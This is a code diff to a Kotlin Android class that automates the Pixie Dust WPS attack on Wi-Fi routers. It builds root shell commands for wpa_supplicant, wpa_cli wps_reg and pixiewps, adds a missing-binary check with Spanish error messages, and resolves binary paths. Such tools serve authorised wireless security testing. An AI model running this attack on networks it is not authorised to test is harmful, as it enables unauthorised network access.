@@ -106,6 +106,19 @@ class PixieDustRunner(
             )
         }
 
+        // --- Verificar que los binarios críticos estén disponibles ---
+        val missing = NativeBinaries.missingCriticalBinaries(context)
+        if (missing.isNotEmpty()) {
+            val missingList = missing.joinToString(", ")
+            return@withContext PixieDustResult.Failure(
+                bssid = bssid,
+                reason = "Binarios nativos faltantes: $missingList. " +
+                    "Empaqueta wpa_supplicant, wpa_cli y pixiewps en assets/wifi/ " +
+                    "o instálalos en el sistema. Consulta BINARIES_SETUP.md",
+                rawOutput = ""
+            )
+        }
+
         // --- Preparar binarios nativos ---
         log("[*] Preparing native binaries...")
         if (!NativeBinaries.ensure(context)) {
@@ -295,9 +308,9 @@ class PixieDustRunner(
 
     private fun buildSupplicantCommand(iface: String, ctrlDir: String): String {
         val dir = NativeBinaries.binaryDir(context)
-        val supplicant = NativeBinaries.wpaSupplicantAssetName()
+        val supplicantPath = NativeBinaries.resolveBinaryPath(context, NativeBinaries.wpaSupplicantAssetName())
         val conf = "$dir/${NativeBinaries.WPA_SUPPLICANT_CONF}"
-        return "export LD_LIBRARY_PATH=$dir; $dir/$supplicant -d -Dnl80211,wext,hostapd,wired " +
+        return "export LD_LIBRARY_PATH=$dir; $supplicantPath -d -Dnl80211,wext,hostapd,wired " +
                 "-i $iface -c$conf -K -O$ctrlDir & pid=\$!; ( sleep 110; kill \$pid 2>/dev/null ) & wait \$pid"
     }
 
@@ -399,7 +412,7 @@ class PixieDustRunner(
     ): ShellExecutor.Result {
         val dir = NativeBinaries.binaryDir(context)
         val ctrlDir = NativeBinaries.ctrlDir()
-        val wpaCli = "./${NativeBinaries.wpaCliAssetName()}"
+        val wpaCli = NativeBinaries.resolveBinaryPath(context, NativeBinaries.wpaCliAssetName())
         val freqSuffix = if (freqMHz != null) " freq=$freqMHz" else ""
         val cmd = "cd $dir && export LD_LIBRARY_PATH=$dir && $wpaCli -p$ctrlDir -i $iface wps_reg $bssid $WPS_REG_PIN_DEFAULT$freqSuffix"
         log("[*] wpa_cli (wps_reg): $cmd")
@@ -460,11 +473,11 @@ class PixieDustRunner(
         m5m7: M3Parser.M5M7Capture?
     ): String {
         val dir = NativeBinaries.binaryDir(context)
-        val pixie = NativeBinaries.pixiewpsAssetName()
+        val pixiePath = NativeBinaries.resolveBinaryPath(context, NativeBinaries.pixiewpsAssetName())
         return if (m5m7 != null && m5m7.hasBoth()) {
-            "$dir/$pixie ${m5m7.toPixiewpsMode3Args(m3)}"
+            "$pixiePath ${m5m7.toPixiewpsMode3Args(m3)}"
         } else {
-            "$dir/$pixie --force ${m3.toPixiewpsArgs()}"
+            "$pixiePath --force ${m3.toPixiewpsArgs()}"
         }
     }
 
@@ -507,7 +520,7 @@ class PixieDustRunner(
             }
 
             val dir = NativeBinaries.binaryDir(context)
-            val wpaCli = "./${NativeBinaries.wpaCliAssetName()}"
+            val wpaCli = NativeBinaries.resolveBinaryPath(context, NativeBinaries.wpaCliAssetName())
             fun cli(cmd: String): ShellExecutor.Result =
                 runSuWithTimeout("cd $dir && export LD_LIBRARY_PATH=$dir && $wpaCli -p$ctrlDir -i $iface $cmd", timeoutSeconds = 5)
 
